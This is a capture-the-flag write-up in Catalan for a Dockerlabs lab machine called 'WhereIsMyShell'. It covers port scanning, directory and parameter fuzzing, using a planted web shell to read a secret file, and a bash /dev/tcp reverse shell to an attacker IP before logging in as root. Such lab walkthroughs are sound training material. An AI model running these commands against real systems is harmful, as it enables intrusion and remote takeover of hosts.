# WhereIsMyShell

Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:28

## Reconeixement

### NMAP

```bash
sudo nmap -p- -sS --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports
```

![image.png](../../.gitbook/assets/image.png)

### FUZZING

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py
```

![image.png](<../../.gitbook/assets/image 1.png>)

/Warning.htm

![image.png](<../../.gitbook/assets/image 2.png>)

Fem fuzzing per trobar el parametre per executar la web shell:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "[http://172.17.0.2/shell.php?FUZZ=key](http://172.17.0.2/shell.php?FUZZ=key)" -fs 0
```

resultat: parameter

executem webshell per veure que hi ha al /tmp

![image.png](<../../.gitbook/assets/image 3.png>)

Encodejem la url:

```bash

ls -la /tmp : ls%20-la%20%2Ftmp
cat /tmp/.secret.txt = cat%20%2Ftmp%2F.secret.txt
```

![image.png](<../../.gitbook/assets/image 4.png>)

Obtenim una rever shell:

```java
http://172.17.0.2/shell.php?parameter=bash> -c "bash -i >%26 /dev/tcp/IP ATACANT/443 0>%261"
```

```bash
# bash -c es per executar la ordre i el "bash -i >%26 /dev/tcp/IP ATACANT/443 0>%261" es la rever
Rever: bash -i >& /dev/tcp/192.168.208.128/443 0>&1
Encode el &:
"bash -i >%26 /dev/tcp/IP ATACANT/443 0>%261"
```

Tractament tty

Utilitzem la contrasenya que hem trobat de root:

![image.png](<../../.gitbook/assets/image 5.png>)
